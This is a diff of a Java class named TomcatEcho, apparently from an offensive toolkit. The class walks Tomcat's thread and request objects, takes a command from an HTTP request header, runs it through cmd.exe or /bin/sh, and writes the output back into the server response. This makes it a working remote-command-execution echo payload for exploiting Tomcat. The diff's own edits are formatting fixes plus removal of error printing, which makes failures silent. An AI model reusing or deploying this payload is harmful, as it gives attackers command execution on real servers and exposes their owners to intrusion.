@@ -4,7 +4,7 @@ import java.lang.reflect.Field;
 
 /**
  * @author Whoopsunix
- *
+ * <p>
  * use https://github.com/c0ny1/java-object-searcher
  * TargetObject = {org.apache.tomcat.util.threads.TaskThread}
  * ---> group = {java.lang.ThreadGroup}
@@ -14,7 +14,7 @@ import java.lang.reflect.Field;
  * ---> this$0 = {org.apache.tomcat.util.net.NioEndpoint}
  * ---> handler = {org.apache.coyote.AbstractProtocol$ConnectionHandler}
  * ---> global = {org.apache.coyote.RequestGroupInfo}
- *
+ * <p>
  * Version test
  * 6.0.53
  * 7.0.59、7.0.109
@@ -42,7 +42,7 @@ public class TomcatEcho {
                 if (!(
                         ((threadName.contains("http-nio") || threadName.contains("http-apr")) && threadName.contains("Poller"))
                                 || (threadName.contains("http-bio") && threadName.contains("AsyncTimeout"))
-                        || (threadName.contains("http-") && threadName.contains("Acceptor"))
+                                || (threadName.contains("http-") && threadName.contains("Acceptor"))
                 ))
                     continue;
 
@@ -62,16 +62,16 @@ public class TomcatEcho {
                     if (header != null && !header.isEmpty()) {
                         String[] cmd = null;
                         String os = System.getProperty("os.name").toLowerCase();
-                        if (os.contains("win")){
+                        if (os.contains("win")) {
                             cmd = new String[]{"cmd.exe", "/c", header};
                         } else {
                             cmd = new String[]{"/bin/sh", "-c", header};
                         }
                         String result = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next();
                         // doWrite
-                        try{
+                        try {
                             response.getClass().getDeclaredMethod("doWrite", java.nio.ByteBuffer.class).invoke(response, java.nio.ByteBuffer.wrap(result.getBytes()));
-                        }catch (NoSuchMethodException e){
+                        } catch (NoSuchMethodException e) {
                             Class clazz = Class.forName("org.apache.tomcat.util.buf.ByteChunk");
                             Object byteChunk = clazz.newInstance();
                             clazz.getDeclaredMethod("setBytes", byte[].class, Integer.TYPE, Integer.TYPE).invoke(byteChunk, result.getBytes(), 0, result.getBytes().length);
@@ -85,7 +85,7 @@ public class TomcatEcho {
             }
         } catch (Exception e) {
             // 测试
-            e.printStackTrace();
+
         }
     }
 
